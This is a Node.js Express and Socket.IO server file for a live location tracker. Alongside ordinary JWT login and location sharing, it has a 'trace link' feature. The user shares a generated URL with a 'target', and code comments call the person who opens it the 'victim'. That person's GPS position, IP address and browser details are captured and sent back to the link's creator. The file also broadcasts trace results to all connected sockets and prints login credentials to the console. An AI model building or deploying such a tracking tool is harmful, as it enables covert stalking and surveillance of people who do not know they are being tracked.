const express = require("express");
const http = require("http");
const path = require("path");
const cors = require("cors");
const jwt = require("jsonwebtoken");
const { Server } = require("socket.io");
const dotenv = require("dotenv");
const { v4: uuidv4 } = require("uuid");
const config = require("./config");

dotenv.config({ path: path.resolve(__dirname, ".env"), override: true });

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

const port = Number(process.env.PORT) || config.PORT || 3001;

// In-memory stores
const traceLinks = new Map(); // token -> { createdAt, locations: [] }
const connectedUsers = new Map(); // socketId -> { username, lat, lng, timestamp }
const locationHistory = new Map(); // username -> [{ lat, lng, timestamp }]

// ─── JWT helpers ──────────────────────────────────────────────────────────────

function issueToken(user) {
  return jwt.sign(
    { username: user.username, role: user.role },
    config.JWT_SECRET,
    { expiresIn: "8h" }
  );
}

function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization || "";
  const token = authHeader.startsWith("Bearer ") ? authHeader.slice(7) : null;

  if (!token) {
    return res.status(401).json({ success: false, message: "Unauthorized" });
  }

  try {
    const decoded = jwt.verify(token, config.JWT_SECRET);
    req.user = decoded;
    return next();
  } catch (error) {
    return res.status(401).json({ success: false, message: "Invalid token" });
  }
}

function requireRole(requiredRole) {
  return (req, res, next) => {
    if (!req.user || req.user.role !== requiredRole) {
      return res.status(403).json({
        success: false,
        message: `Access denied. Requires ${requiredRole} role.`,
      });
    }
    return next();
  };
}

// ─── Middleware ───────────────────────────────────────────────────────────────

app.use(cors({ origin: true, credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static views (map.html, login.html, trace.html etc.)
app.use(express.static(path.join(__dirname, "views")));
app.use(express.static(path.join(__dirname, "public")));

// ─── Health & info ────────────────────────────────────────────────────────────

app.get("/health", (req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString() });
});

app.get("/api", (req, res) => {
  res.json({ message: "Live Location Tracker API", version: "2.0.0" });
});

// ─── Auth endpoints ───────────────────────────────────────────────────────────

app.post("/api/login", (req, res) => {
  const { username, password } = req.body || {};

  if (username === config.USERNAME && password === config.PASSWORD) {
    const token = issueToken({ username, role: config.ROLE });
    return res.json({
      success: true,
      message: "Login successful",
      token,
      user: { username, role: config.ROLE },
    });
  }

  return res.status(401).json({
    success: false,
    message: "Invalid credentials. Please try again.",
  });
});

app.get("/api/me", requireAuth, (req, res) => {
  res.json({
    success: true,
    user: { username: req.user.username, role: req.user.role },
  });
});

// ─── Location endpoints ───────────────────────────────────────────────────────

// Get all currently connected users and their last known locations
app.get("/api/locations", requireAuth, (req, res) => {
  const users = [];
  connectedUsers.forEach((data, socketId) => {
    users.push({ id: socketId, ...data });
  });
  res.json({ success: true, users });
});

// Get location history for the authenticated user
app.get("/api/history", requireAuth, (req, res) => {
  const history = locationHistory.get(req.user.username) || [];
  res.json({ success: true, history });
});

// REST endpoint to push a location update (used when no socket available)
app.post("/api/location", requireAuth, (req, res) => {
  const { lat, lng, accuracy } = req.body || {};
  if (lat === undefined || lng === undefined) {
    return res.status(400).json({ success: false, message: "Missing lat/lng" });
  }

  const username = req.user.username;
  const entry = {
    lat: Number(lat),
    lng: Number(lng),
    accuracy: Number(accuracy) || 0,
    timestamp: new Date().toISOString(),
  };

  // Store history
  if (!locationHistory.has(username)) {
    locationHistory.set(username, []);
  }
  const hist = locationHistory.get(username);
  hist.push(entry);
  if (hist.length > 200) hist.splice(0, hist.length - 200); // cap at 200

  // Broadcast to all viewers
  io.emit("receive-location", { id: username, username, ...entry });

  return res.json({ success: true });
});

// ─── Trace link endpoints ─────────────────────────────────────────────────────

// Create a trace link — returns a short token that can be shared as a URL
app.post("/api/trace/create", requireAuth, (req, res) => {
  const token = uuidv4().replace(/-/g, "").slice(0, 12);
  traceLinks.set(token, {
    createdBy: req.user.username,
    createdAt: new Date().toISOString(),
    locations: [],
  });

  // The link the user shares with their "target"
  const baseUrl = req.protocol + "://" + req.get("host");
  const traceUrl = `${baseUrl}/trace/${token}`;

  return res.json({ success: true, token, url: traceUrl });
});

// Public trace page — when victim opens the link, browser asks for GPS consent
app.get("/trace/:token", (req, res) => {
  const { token } = req.params;
  if (!traceLinks.has(token)) {
    return res.status(404).send("This trace link is invalid or has expired.");
  }
  res.sendFile(path.join(__dirname, "views", "trace.html"));
});

// Victim's browser posts their location here (from trace.html JS)
app.post("/api/trace/:token/location", (req, res) => {
  const { token } = req.params;
  if (!traceLinks.has(token)) {
    return res.status(404).json({ success: false, message: "Invalid token" });
  }

  const { lat, lng, accuracy, ip } = req.body || {};
  if (lat === undefined || lng === undefined) {
    return res.status(400).json({ success: false, message: "Missing lat/lng" });
  }

  const entry = {
    lat: Number(lat),
    lng: Number(lng),
    accuracy: Number(accuracy) || 0,
    ip: ip || req.ip || req.headers["x-forwarded-for"] || "unknown",
    userAgent: req.headers["user-agent"] || "unknown",
    timestamp: new Date().toISOString(),
  };

  const traceData = traceLinks.get(token);
  traceData.locations.push(entry);

  // Notify the creator via socket event
  io.emit(`trace-update-${token}`, entry);

  return res.json({ success: true, message: "Location captured" });
});

// Creator polls for trace results
app.get("/api/trace/:token/results", requireAuth, (req, res) => {
  const { token } = req.params;
  if (!traceLinks.has(token)) {
    return res.status(404).json({ success: false, message: "Invalid token" });
  }

  const traceData = traceLinks.get(token);
  if (traceData.createdBy !== req.user.username) {
    return res.status(403).json({ success: false, message: "Access denied" });
  }

  return res.json({
    success: true,
    token,
    createdAt: traceData.createdAt,
    locations: traceData.locations,
  });
});

// Delete a trace link
app.delete("/api/trace/:token", requireAuth, (req, res) => {
  const { token } = req.params;
  if (!traceLinks.has(token)) {
    return res.status(404).json({ success: false, message: "Not found" });
  }
  traceLinks.delete(token);
  return res.json({ success: true });
});

// ─── Socket.IO ────────────────────────────────────────────────────────────────

io.on("connection", (socket) => {
  console.log(`✅ Client connected: ${socket.id}`);

  // Client sends their location
  socket.on("send-location", (data) => {
    const { latitude, longitude, accuracy, username } = data;
    const entry = {
      lat: Number(latitude),
      lng: Number(longitude),
      accuracy: Number(accuracy) || 0,
      username: username || socket.id,
      timestamp: new Date().toISOString(),
    };

    connectedUsers.set(socket.id, entry);

    // Store history per username
    if (username) {
      if (!locationHistory.has(username)) locationHistory.set(username, []);
      const hist = locationHistory.get(username);
      hist.push({ lat: entry.lat, lng: entry.lng, accuracy: entry.accuracy, timestamp: entry.timestamp });
      if (hist.length > 200) hist.splice(0, hist.length - 200);
    }

    io.emit("receive-location", { id: socket.id, ...entry });
  });

  // Subscribe to a trace token to receive real-time updates
  socket.on("subscribe-trace", ({ token }) => {
    if (traceLinks.has(token)) {
      socket.join(`trace-${token}`);
    }
  });

  socket.on("disconnect", () => {
    console.log(`❌ Client disconnected: ${socket.id}`);
    connectedUsers.delete(socket.id);
    io.emit("user-disconnected", socket.id);
  });
});

// ─── Start server ─────────────────────────────────────────────────────────────

function startServer(tryPort) {
  server.listen(tryPort, () => {
    console.log(`🚀 Backend running at http://localhost:${tryPort}`);
    console.log(`📍 Socket.IO ready`);
    console.log(`🔑 Login: ${config.USERNAME} / ${config.PASSWORD}`);
  });

  server.on("error", (error) => {
    if (error.code === "EADDRINUSE") {
      console.log(`⚠️  Port ${tryPort} busy — trying ${tryPort + 1}...`);
      startServer(tryPort + 1);
    } else {
      console.error("Server error:", error);
      process.exit(1);
    }
  });
}

startServer(port);
